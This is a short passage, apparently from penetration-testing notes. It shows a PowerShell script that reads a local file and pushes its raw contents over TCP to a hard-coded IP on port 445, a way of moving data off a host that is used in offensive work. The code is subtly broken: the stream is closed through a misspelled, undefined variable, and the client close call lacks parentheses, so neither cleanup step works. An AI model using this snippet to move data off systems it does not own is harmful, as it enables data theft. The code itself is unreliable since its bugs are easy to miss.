...
```powershell
# Specifying the target IP address and port
$targetIp = "192.168.1.39"
$targetPort = 445

# Specifying the path to the file taht we want transfer
$fileToSend = "C:\Users\dobliuw\Desktop\hackingNotes.txt"

# Reading the file content
$fileContent = Get-Content -Path $fileToSend -Raw

# Creating a TCP client and connecting to the target host
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($targetIp, $targetPort)

# Getting the network streams for sending data
$stream = $client.GetStream()

# Converting the file contento to bytes and send it over the network stream
$bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($fileContent)
$stream.Write($bytesToSend, 0, $bytesToSend.Length)

# Closing the network stream and the TCP client
$stram.close()
$client.close
```
